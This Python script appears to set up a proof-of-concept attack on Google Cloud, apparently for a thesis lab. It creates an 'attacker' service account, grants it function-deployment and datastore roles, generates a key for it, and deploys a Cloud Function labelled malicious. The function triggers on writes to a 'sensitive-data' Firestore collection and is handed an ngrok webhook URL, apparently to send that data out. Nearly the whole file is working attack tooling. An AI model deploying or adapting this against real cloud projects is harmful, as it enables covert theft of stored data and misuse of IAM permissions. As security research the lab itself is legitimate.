import subprocess
import os
import shutil

# === CONFIG ===
PROJECT_ID = "poc-tfm-tests"
REGION = "europe-west1"
FUNCTION_NAME = "firestore-trigger"
COLLECTION_PATH = "sensitive-data/test"
ATTACKER_SA = "attacker-sa"
FUNCTION_DIR = os.path.join(os.path.dirname(__file__), "function")
WORKING_DIR = os.path.join(os.path.dirname(__file__), "temp_function")
KEY_FILE = os.path.join(os.path.dirname(__file__), "attacker-sa-key.json")
WEBHOOK_FILE = "webhook_url.txt"

# === 1. Leer webhook URL ===
print("[1/5] Reading webhook URL...")
if not os.path.exists(WEBHOOK_FILE):
    print("[!] Missing webhook_url.txt. Run run_attack.py to launch ngrok first.")
    exit(1)

with open(WEBHOOK_FILE, "r") as f:
    webhook_url = f.read().strip()

print(f"[✓] Webhook URL: {webhook_url}")

# === 2. Preparar código fuente temporal con URL embebida ===
print("[2/5] Preparing function source...")
if os.path.exists(WORKING_DIR):
    shutil.rmtree(WORKING_DIR)
shutil.copytree(FUNCTION_DIR, WORKING_DIR)

# Reemplazar marcador en main.py
main_path = os.path.join(WORKING_DIR, "main.py")
with open(main_path, "r") as f:
    content = f.read()

content = content.replace("{{WEBHOOK_URL}}", webhook_url)

with open(main_path, "w") as f:
    f.write(content)

# === 3. Crear attacker-sa y asignar permisos mínimos ===
print("[3/5] Creating attacker service account and assigning permissions...")

subprocess.run([
    "gcloud", "iam", "service-accounts", "create", ATTACKER_SA,
    "--project", PROJECT_ID
], check=True)

roles = [
    "roles/cloudfunctions.developer",
    "roles/iam.serviceAccountUser",
    "roles/datastore.user"
]

for role in roles:
    subprocess.run([
        "gcloud", "projects", "add-iam-policy-binding", PROJECT_ID,
        "--member", f"serviceAccount:{ATTACKER_SA}@{PROJECT_ID}.iam.gserviceaccount.com",
        "--role", role
    ], check=True)

# === 4. Generar clave JSON del atacante ===
print("[4/5] Generating attacker service account key...")
subprocess.run([
    "gcloud", "iam", "service-accounts", "keys", "create", KEY_FILE,
    "--iam-account", f"{ATTACKER_SA}@{PROJECT_ID}.iam.gserviceaccount.com"
], check=True)

# === 5. Desplegar función maliciosa Gen 1 ===
print("[5/5] Deploying malicious Cloud Function (Firestore trigger)...")
subprocess.run([
    "gcloud", "functions", "deploy", FUNCTION_NAME,
    "--runtime", "python310",
    "--trigger-event", "providers/cloud.firestore/eventTypes/document.write",
    "--trigger-resource", f"projects/{PROJECT_ID}/databases/(default)/documents/sensitive-data/{{docId}}",
    "--region", REGION,
    "--entry-point", "malicious_trigger",
    "--source", WORKING_DIR,
    "--memory", "128MB",
    "--service-account", f"{ATTACKER_SA}@{PROJECT_ID}.iam.gserviceaccount.com",
    "--allow-unauthenticated",
    "--no-gen2",
    "--set-env-vars", f"WEBHOOK_URL={webhook_url}"
], check=True)



print("[✔] Environment created successfully.")
